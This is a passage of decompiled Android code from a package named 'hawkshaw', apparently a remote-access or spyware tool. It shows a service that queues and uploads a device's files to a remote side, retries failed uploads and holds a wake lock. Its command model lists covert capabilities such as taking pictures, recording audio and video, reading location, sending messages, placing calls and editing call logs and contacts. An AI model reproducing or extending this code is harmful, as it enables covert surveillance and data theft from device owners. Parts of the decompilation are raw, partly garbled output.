            com.hawkshaw.library.features.media.filecrud.PushFileManagerService r2 = r2.f1522D
            Y1.C0110h.P(r1)
            goto L_0x00ac
        L_0x0058:
            boolean r4 = r2.f1523E
            com.hawkshaw.library.features.media.filecrud.PushFileManagerService r10 = r2.f1522D
            Y1.C0110h.P(r1)
            goto L_0x007f
        L_0x0060:
            Y1.C0110h.P(r1)
            boolean r4 = r85.hasWifiNetwork()
            com.hawkshaw.library.datalayer.room.AppDatabase r1 = com.hawkshaw.library.datalayer.room.AppDatabaseKt.getDb()
            com.hawkshaw.library.datalayer.room.files.PushFileTaskDao r1 = r1.pushFileTaskDao()
            r2.f1522D = r0
            r2.f1523E = r4
            if (r4 == 0) goto L_0x0082
            r2.f1526H = r8
            java.lang.Object r1 = r1.getTopTask(r2)
            if (r1 != r3) goto L_0x007e
            return r3
        L_0x007e:
            r10 = r0
        L_0x007f:
            java.util.List r1 = (java.util.List) r1
            goto L_0x008d
        L_0x0082:
            r2.f1526H = r7
            r10 = 104857600(0x6400000, float:3.6111186E-35)
            java.lang.Object r1 = r1.getTopTask(r10, r2)
            if (r1 != r3) goto L_0x007e
            return r3
        L_0x008d:
            java.lang.Object r1 = X2.o.T0(r1)
            com.hawkshaw.library.datalayer.room.files.PushFileTaskEntity r1 = (com.hawkshaw.library.datalayer.room.files.PushFileTaskEntity) r1
            if (r1 != 0) goto L_0x00d6
            if (r4 != 0) goto L_0x00c3
            com.hawkshaw.library.datalayer.room.AppDatabase r1 = com.hawkshaw.library.datalayer.room.AppDatabaseKt.getDb()
            com.hawkshaw.library.datalayer.room.files.PushFileTaskDao r1 = r1.pushFileTaskDao()
            r2.f1522D = r10
            r4 = 3
            r2.f1526H = r4
            java.lang.Object r1 = r1.getTopTask(r2)
            if (r1 != r3) goto L_0x00ab
            return r3
        L_0x00ab:
            r2 = r10
        L_0x00ac:
            java.util.Collection r1 = (java.util.Collection) r1
            boolean r1 = r1.isEmpty()
            r1 = r1 ^ r8
            if (r1 == 0) goto L_0x00c2
            com.hawkshaw.library.logger.Logger r6 = com.hawkshaw.library.logger.Logger.INSTANCE
            java.lang.String r8 = "PushFile: Large file, wifi not available, aborting...,"
            r9 = 0
            java.lang.String r7 = "PushFileManagerService"
            r10 = 4
            r11 = 0
            com.hawkshaw.library.logger.Logger.v$default(r6, r7, r8, r9, r10, r11)
            goto L_0x00d1
        L_0x00c2:
            r10 = r2
        L_0x00c3:
            com.hawkshaw.library.logger.Logger r11 = com.hawkshaw.library.logger.Logger.INSTANCE
            java.lang.String r13 = "PushFile: No pending push file task"
            r14 = 0
            java.lang.String r12 = "PushFileManagerService"
            r15 = 4
            r16 = 0
            com.hawkshaw.library.logger.Logger.v$default(r11, r12, r13, r14, r15, r16)
            r2 = r10
        L_0x00d1:
            r2.stopSelf()
            goto L_0x0203
        L_0x00d6:
            int r4 = r1.getPriority()
            if (r4 <= r6) goto L_0x012d
            com.hawkshaw.library.logger.Logger r11 = com.hawkshaw.library.logger.Logger.INSTANCE
            int r4 = r1.getPriority()
            java.lang.String r7 = r1.getPath()
            java.lang.StringBuilder r8 = new java.lang.StringBuilder
            java.lang.String r12 = "PushFile: Re-tries("
            r8.<init>(r12)
            r8.append(r4)
            java.lang.String r4 = ") exhausted for "
            r8.append(r4)
            r8.append(r7)
            java.lang.String r4 = ". Removing from PushFile list"
            r8.append(r4)
            java.lang.String r13 = r8.toString()
            r14 = 0
            r15 = 0
            java.lang.String r12 = "PushFileManagerService"
            r16 = 12
            r17 = 0
            com.hawkshaw.library.logger.Logger.e$default(r11, r12, r13, r14, r15, r16, r17)
            com.hawkshaw.library.datalayer.room.AppDatabase r4 = com.hawkshaw.library.datalayer.room.AppDatabaseKt.getDb()
            com.hawkshaw.library.datalayer.room.files.PushFileTaskDao r4 = r4.pushFileTaskDao()
            r2.f1522D = r10
            r7 = 4
            r2.f1526H = r7
            java.lang.Object r1 = r4.delete(r1, r2)
            if (r1 != r3) goto L_0x0120
            return r3
        L_0x0120:
            r4 = r10
        L_0x0121:
            r2.f1522D = r9
            r2.f1526H = r6
            java.lang.Object r1 = r4.pushNextFile(r2)
            if (r1 != r3) goto L_0x012c
            return r3
        L_0x012c:
            return r5
        L_0x012d:
            long r11 = java.lang.System.currentTimeMillis()
            long r13 = r1.getLastPushTimestamp()
            long r11 = r11 - r13
            r13 = 300000(0x493e0, double:1.482197E-318)
            int r4 = (r11 > r13 ? 1 : (r11 == r13 ? 0 : -1))
            if (r4 >= 0) goto L_0x0204
            com.hawkshaw.library.logger.Logger r11 = com.hawkshaw.library.logger.Logger.INSTANCE
            java.lang.String r1 = r1.getPath()
            java.lang.String r4 = "PushFile: Last try was failed for "
            java.lang.String r6 = ". Will retry after some time."
            java.lang.String r13 = i.C0528x.d(r4, r1, r6)
            r14 = 0
            java.lang.String r12 = "PushFileManagerService"
            r15 = 4
            r16 = 0
            com.hawkshaw.library.logger.Logger.v$default(r11, r12, r13, r14, r15, r16)
            com.hawkshaw.library.datalayer.models.Command$ScheduleCommandRequest r17 = new com.hawkshaw.library.datalayer.models.Command$ScheduleCommandRequest
            r50 = r17
            com.hawkshaw.library.datalayer.models.Command r18 = new com.hawkshaw.library.datalayer.models.Command
            r51 = r18
            com.hawkshaw.library.datalayer.models.Command$CommandType r52 = com.hawkshaw.library.datalayer.models.Command.CommandType.SyncPushFiles
            r81 = 0
            r82 = 0
            r83 = 1073741822(0x3ffffffe, float:1.9999998)
            r84 = 0
            r53 = 0
            r55 = 0
            r56 = 0
            r57 = 0
            r58 = 0
            r59 = 0
            r60 = 0
            r61 = 0
            r62 = 0
            r63 = 0
            r64 = 0
            r65 = 0
            r66 = 0
            r67 = 0
            r68 = 0
            r69 = 0
            r70 = 0
            r71 = 0
            r72 = 0
            r73 = 0
            r74 = 0
            r75 = 0
            r76 = 0
            r77 = 0
            r78 = 0
            r79 = 0
            r80 = 0
            r51.<init>((com.hawkshaw.library.datalayer.models.Command.CommandType) r52, (long) r53, (com.hawkshaw.library.datalayer.models.Command.ThumbnailRequest) r55, (com.hawkshaw.library.datalayer.models.Command.FileRequest) r56, (com.hawkshaw.library.datalayer.models.Command.FilesRequest) r57, (com.hawkshaw.library.datalayer.models.Command.DeletePendingPushFilesRequest) r58, (com.hawkshaw.library.datalayer.models.Command.DeleteFileRequest) r59, (com.hawkshaw.library.datalayer.models.Command.AddCallLogRequest) r60, (com.hawkshaw.library.datalayer.models.Command.DeleteCallLogRequest) r61, (com.hawkshaw.library.datalayer.models.Command.AddContactRequest) r62, (com.hawkshaw.library.datalayer.models.Command.DeleteContactRequest) r63, (com.hawkshaw.library.datalayer.models.Command.SendMessageRequest) r64, (com.hawkshaw.library.datalayer.models.Command.GetLocationRequest) r65, (com.hawkshaw.library.datalayer.models.Command.VibrateRequest) r66, (com.hawkshaw.library.datalayer.models.Command.FlashRequest) r67, (com.hawkshaw.library.datalayer.models.Command.TakePictureRequest) r68, (com.hawkshaw.library.datalayer.models.Command.RecordVideoRequest) r69, (com.hawkshaw.library.datalayer.models.Command.RecordAudioRequest) r70, (com.hawkshaw.library.datalayer.models.Command.PushDeviceInfoRequest) r71, (com.hawkshaw.library.datalayer.models.Command.OpenAppRequest) r72, (com.hawkshaw.library.datalayer.models.Command.MakeCallRequest) r73, (com.hawkshaw.library.datalayer.models.Command.DeviceAudioRequest) r74, (com.hawkshaw.library.datalayer.models.Command.OpenDeeplinkRequest) r75, (com.hawkshaw.library.datalayer.models.Command.LoginRequest) r76, (com.hawkshaw.library.datalayer.models.Command.ScheduleCommandRequest) r77, (com.hawkshaw.library.datalayer.models.Command.CancelScheduledCommandRequest) r78, (com.hawkshaw.library.datalayer.models.Command.AccessibilityCommandRequest) r79, (com.hawkshaw.library.datalayer.models.Command.StartRepeatPushDataRequest) r80, (com.hawkshaw.library.datalayer.models.Command.SetDynamicConfigRequest) r81, (com.hawkshaw.library.datalayer.models.Command.SyncAppConfigRequest) r82, (int) r83, (j3.f) r84)
            long r11 = java.lang.System.currentTimeMillis()
            r1 = 300000(0x493e0, float:4.2039E-40)
            long r13 = (long) r1
            long r19 = r11 + r13
            r21 = 0
            r23 = 44
            r17.<init>(r18, r19, r21, r23)
            com.hawkshaw.library.datalayer.models.Command r1 = new com.hawkshaw.library.datalayer.models.Command
            r24 = r1
            com.hawkshaw.library.datalayer.models.Command$CommandType r25 = com.hawkshaw.library.datalayer.models.Command.CommandType.ScheduleCommand
            r54 = 0
            r56 = 1056964606(0x3efffffe, float:0.49999994)
            r26 = 0
            r28 = 0
            r29 = 0
            r30 = 0
            r31 = 0
            r32 = 0
            r33 = 0
            r34 = 0
            r35 = 0
            r36 = 0
            r37 = 0
            r38 = 0
            r39 = 0
            r40 = 0
            r41 = 0
            r42 = 0
            r43 = 0
            r44 = 0
            r45 = 0
            r46 = 0
            r47 = 0
            r48 = 0
            r49 = 0
            r51 = 0
            r52 = 0
            r53 = 0
            r24.<init>((com.hawkshaw.library.datalayer.models.Command.CommandType) r25, (long) r26, (com.hawkshaw.library.datalayer.models.Command.ThumbnailRequest) r28, (com.hawkshaw.library.datalayer.models.Command.FileRequest) r29, (com.hawkshaw.library.datalayer.models.Command.FilesRequest) r30, (com.hawkshaw.library.datalayer.models.Command.DeletePendingPushFilesRequest) r31, (com.hawkshaw.library.datalayer.models.Command.DeleteFileRequest) r32, (com.hawkshaw.library.datalayer.models.Command.AddCallLogRequest) r33, (com.hawkshaw.library.datalayer.models.Command.DeleteCallLogRequest) r34, (com.hawkshaw.library.datalayer.models.Command.AddContactRequest) r35, (com.hawkshaw.library.datalayer.models.Command.DeleteContactRequest) r36, (com.hawkshaw.library.datalayer.models.Command.SendMessageRequest) r37, (com.hawkshaw.library.datalayer.models.Command.GetLocationRequest) r38, (com.hawkshaw.library.datalayer.models.Command.VibrateRequest) r39, (com.hawkshaw.library.datalayer.models.Command.FlashRequest) r40, (com.hawkshaw.library.datalayer.models.Command.TakePictureRequest) r41, (com.hawkshaw.library.datalayer.models.Command.RecordVideoRequest) r42, (com.hawkshaw.library.datalayer.models.Command.RecordAudioRequest) r43, (com.hawkshaw.library.datalayer.models.Command.PushDeviceInfoRequest) r44, (com.hawkshaw.library.datalayer.models.Command.OpenAppRequest) r45, (com.hawkshaw.library.datalayer.models.Command.MakeCallRequest) r46, (com.hawkshaw.library.datalayer.models.Command.DeviceAudioRequest) r47, (com.hawkshaw.library.datalayer.models.Command.OpenDeeplinkRequest) r48, (com.hawkshaw.library.datalayer.models.Command.LoginRequest) r49, (com.hawkshaw.library.datalayer.models.Command.ScheduleCommandRequest) r50, (com.hawkshaw.library.datalayer.models.Command.CancelScheduledCommandRequest) r51, (com.hawkshaw.library.datalayer.models.Command.AccessibilityCommandRequest) r52, (com.hawkshaw.library.datalayer.models.Command.StartRepeatPushDataRequest) r53, (com.hawkshaw.library.datalayer.models.Command.SetDynamicConfigRequest) r54, (com.hawkshaw.library.datalayer.models.Command.SyncAppConfigRequest) r55, (int) r56, (j3.f) r57)
            r2.f1522D = r10
            r4 = 6
            r2.f1526H = r4
            java.lang.Object r1 = com.hawkshaw.library.handler.CommandResolverKt.handleCommand$default(r1, r9, r2, r7, r9)
            if (r1 != r3) goto L_0x01ff
            return r3
        L_0x01ff:
            r2 = r10
        L_0x0200:
            r2.stopSelf()
        L_0x0203:
            return r5
        L_0x0204:
            r2.f1522D = r10
            r4 = 7
            r2.f1526H = r4
            java.lang.Object r1 = r10.pushFile(r1, r2)
            if (r1 != r3) goto L_0x0210
            return r3
        L_0x0210:
            r4 = r10
        L_0x0211:
            r2.f1522D = r9
            r1 = 8
            r2.f1526H = r1
            java.lang.Object r1 = r4.pushNextFile(r2)
            if (r1 != r3) goto L_0x021e
            return r3
        L_0x021e:
            return r5
        */
        throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.features.media.filecrud.PushFileManagerService.pushNextFile(a3.e):java.lang.Object");
    }

    public void onCreate() {
        super.onCreate();
        getWakeLock().acquire(1800000);
        CoroutineKt.safeLaunch$default(C0769d.R(this), (j) null, new d(this, (a3.e) null), 1, (Object) null);
    }

    public void onDestroy() {
        Logger.v$default(Logger.INSTANCE, TAG, "OnDestroy called", false, 4, (Object) null);
        getWakeLock().release();
        super.onDestroy();
    }
}
